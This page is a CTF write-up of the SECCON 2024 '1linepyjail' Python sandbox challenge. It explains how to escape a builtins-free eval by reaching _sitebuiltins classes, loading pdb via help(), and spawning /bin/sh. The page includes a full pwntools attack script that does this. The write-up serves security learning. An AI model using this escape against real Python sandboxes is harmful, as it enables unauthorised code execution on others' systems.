
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="CTF Writeups by @jiegec">
      
      
      
        <link rel="canonical" href="https://jia.je/ctf-writeups/misc/pyjail/seccon-2024-quals-1linepyjail.html">
      
      
      
      
        
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="zensical-0.0.37">
    
    
      
        <title>Seccon 2024 quals 1linepyjail - CTF Writeups by @jiegec</title>
      
    
    
      
        
      
      <link rel="stylesheet" href="../../assets/stylesheets/modern/main.1e981d71.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,500,500i,700,700i%7CJetBrains+Mono:400,400i,700,700i&amp;display=fallback">
        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,t)=>(e<<5)-e+t.charCodeAt(0)),0),__md_get=(e,t=localStorage,a=__md_scope)=>JSON.parse(t.getItem(a.pathname+"."+e)),__md_set=(e,t,a=localStorage,_=__md_scope)=>{try{a.setItem(_.pathname+"."+e,JSON.stringify(t))}catch(e){}},document.documentElement.setAttribute("data-platform",navigator.platform)</script>
    
      
  


  <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-3109FRSVTT"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-3109FRSVTT');
</script>

<script
    src="https://analytics.jiege.pro/api/script.js"
    data-site-id="1"
    defer
></script>
  
    <script>"undefined"!=typeof __md_analytics&&__md_analytics()</script>
  

    
    
  </head>
  
  
    <body dir="ltr">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer" aria-label="Navigation"></label>
    <div data-md-component="skip">
      
        
        <a href="#seccon-2024-quals-seccon-13-online-ctf-1linepyjail" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../index.html" title="CTF Writeups by @jiegec" class="md-header__button md-logo" aria-label="CTF Writeups by @jiegec" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open" viewBox="0 0 24 24"><path d="M12 7v14M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer" aria-label="Navigation">
      
      <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-menu" viewBox="0 0 24 24"><path d="M4 5h16M4 12h16M4 19h16"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            CTF Writeups by @jiegec
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Seccon 2024 quals 1linepyjail
            
          </span>
        </div>
      </div>
    </div>
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search" aria-label="Search">
          
          <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-search" viewBox="0 0 24 24"><path d="m21 21-4.34-4.34"/><circle cx="11" cy="11" r="8"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog" aria-label="Search">
  <button type="button" class="md-search__button">
    Search
  </button>
</div>
      
    
    <div class="md-header__source">
      
    </div>
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../index.html" title="CTF Writeups by @jiegec" class="md-nav__button md-logo" aria-label="CTF Writeups by @jiegec" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open" viewBox="0 0 24 24"><path d="M12 7v14M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z"/></svg>

    </a>
    CTF Writeups by @jiegec
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../index.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Home
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../solution.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Writeups by Solution
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../pyjail.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Pyjail
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../puppeteer/index.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Redbud Puppeteer
  

    
  </span>
  
  

      </a>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  
                    
                    
                    
                    
                      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
                      <div class="md-sidebar-button__wrapper">
                        <label class="md-sidebar-button" for="__toc"></label>
                      </div>
                    
                  
                  <div class="md-sidebar__inner">
                    


<nav class="md-nav md-nav--secondary" aria-label="On this page">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      On this page
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#seccon-2024-quals-seccon-13-online-ctf-1linepyjail" class="md-nav__link">
    <span class="md-ellipsis">
      <span class="md-typeset">
        SECCON 2024 Quals (SECCON 13 Online CTF) 1linepyjail
      </span>
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              
              <article class="md-content__inner md-typeset">
                
                  

  <h1 id="__skip">Seccon 2024 quals 1linepyjail</h1>

<h2 id="seccon-2024-quals-seccon-13-online-ctf-1linepyjail">SECCON 2024 Quals (SECCON 13 Online CTF) 1linepyjail</h2>
<p>Official archive: <a href="https://github.com/SECCON/SECCON13_online_CTF/blob/main/jail/1linepyjail/README.md">https://github.com/SECCON/SECCON13_online_CTF/blob/main/jail/1linepyjail/README.md</a></p>
<div class="highlight"><pre><span></span><code><span class="nb">print</span><span class="p">(</span><span class="nb">eval</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="p">{</span><span class="s2">&quot;__builtins__&quot;</span><span class="p">:</span> <span class="kc">None</span><span class="p">},</span> <span class="p">{})</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">code</span> <span class="o">:=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&quot;jail&gt; &quot;</span><span class="p">))</span> <span class="o">&lt;=</span> <span class="mi">100</span> <span class="ow">and</span> <span class="nb">__import__</span><span class="p">(</span><span class="s2">&quot;re&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">fullmatch</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;([^()]|\(\))*&#39;</span><span class="p">,</span> <span class="n">code</span><span class="p">)</span> <span class="k">else</span> <span class="s2">&quot;:(&quot;</span><span class="p">)</span>
</code></pre></div>
<p>Requirements:</p>
<ol>
<li>Length &lt;= 100: Try hard to reduce input length</li>
<li>Allow <code>()</code> but no parameters: Use <code>sys.modules["pdb"].set_trace()</code></li>
<li>No builtins: Use <code>().__class__.__base__.__subclasses__()</code> to find <code>sys</code></li>
</ol>
<p>Steps:</p>
<ol>
<li>Locate <code>&lt;class '_sitebuiltins._Helper'&gt;</code> and <code>&lt;class '_sitebuiltins._Printer'&gt;</code> in <code>().__class__.__base__.__subclasses__()</code></li>
<li>Call <code>help()</code> via <code>&lt;class '_sitebuiltins._Helper'&gt;</code> and load <code>pdb</code> module in help() system</li>
<li>Locate <code>sys</code> module via <code>&lt;class '_sitebuiltins._Printer'&gt;.__init__.__globals__</code> and execute <code>sys.modules['pdb'].set_trace()</code></li>
</ol>
<p>Attack script:</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&quot;debug&quot;</span><span class="p">)</span>

<span class="c1"># step 1. locate Helper and Printer</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&quot;python3&quot;</span><span class="p">,</span> <span class="s2">&quot;jail.py&quot;</span><span class="p">])</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;jail&gt;&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;().__class__.__base__.__subclasses__()&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
<span class="n">res</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>

<span class="n">helper_index</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;, &quot;</span><span class="p">)</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s2">&quot;&lt;class &#39;_sitebuiltins._Helper&#39;&gt;&quot;</span><span class="p">)</span>
<span class="n">printer_index</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;, &quot;</span><span class="p">)</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s2">&quot;&lt;class &#39;_sitebuiltins._Printer&#39;&gt;&quot;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Helper&quot;</span><span class="p">,</span> <span class="n">helper_index</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Printer&quot;</span><span class="p">,</span> <span class="n">printer_index</span><span class="p">)</span>

<span class="c1"># step 2. call help() to load pdb module</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&quot;python3&quot;</span><span class="p">,</span> <span class="s2">&quot;jail.py&quot;</span><span class="p">])</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;jail&gt;&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span>
    <span class="p">(</span>
        <span class="sa">f</span><span class="s2">&quot;().__class__.__base__.__subclasses__()[</span><span class="si">{</span><span class="n">helper_index</span><span class="si">}</span><span class="s2">]()()&quot;</span>
    <span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
<span class="p">)</span>
<span class="c1"># load pdb and return to jail</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;pdb&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;jail&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;jail&gt;&quot;</span><span class="p">)</span>
<span class="c1"># step 3. locate sys module and call `sys.modules[&#39;pdb&#39;].set_trace()`</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span>
    <span class="p">(</span>
        <span class="sa">f</span><span class="s2">&quot;().__class__.__base__.__subclasses__()[</span><span class="si">{</span><span class="n">printer_index</span><span class="si">}</span><span class="s2">].__init__.__globals__[&#39;sys&#39;].modules[&#39;pdb&#39;].set_trace()&quot;</span>
    <span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
<span class="p">)</span>
<span class="c1"># in pdb</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;(Pdb) &quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span>
    <span class="p">(</span>
        <span class="sa">f</span><span class="s2">&quot;().__class__.__base__.__subclasses__()[</span><span class="si">{</span><span class="n">printer_index</span><span class="si">}</span><span class="s2">].__init__.__globals__[&#39;sys&#39;].modules[&#39;os&#39;].system(&#39;/bin/sh&#39;)&quot;</span>
    <span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
<span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>











  



<h2 id="__comments">Comments</h2>
<!-- Insert generated snippet here -->
<script src="https://giscus.app/client.js"
    data-repo="jiegec/ctf-writeups"
    data-repo-id="MDEwOlJlcG9zaXRvcnkxNTE1MzAxODQ="
    data-category="General"
    data-category-id="DIC_kwDOCQgqyM4CvbYX"
    data-mapping="pathname"
    data-strict="1"
    data-reactions-enabled="1"
    data-emit-metadata="0"
    data-input-position="top"
    data-theme="light"
    data-lang="en"
    data-loading="lazy"
    crossorigin="anonymous"
    async>
</script>
                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      Copyright &copy; 2025-2026 Jiajie Chen
    </div>
  
  
    Made with
    <a href="https://zensical.org/" target="_blank" rel="noopener">
      Zensical
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      
      <script id="__config" type="application/json">{"annotate":null,"base":"../..","features":[],"search":"../../assets/javascripts/workers/search.e2d2d235.min.js","tags":null,"translations":{"clipboard.copied":"Copied to clipboard","clipboard.copy":"Copy to clipboard","search.result.more.one":"1 more on this page","search.result.more.other":"# more on this page","search.result.none":"No matching documents","search.result.one":"1 matching document","search.result.other":"# matching documents","search.result.placeholder":"Type to start searching","search.result.term.missing":"Missing","select.version":"Select version"},"version":null}</script>
    
    
      <script src="../../assets/javascripts/bundle.dbc0afdc.min.js"></script>
      
        <script src="../../javascripts/mathjax.js"></script>
      
        <script src="https://unpkg.com/mathjax@3/es5/tex-mml-chtml.js"></script>
      
    
  </body>
</html>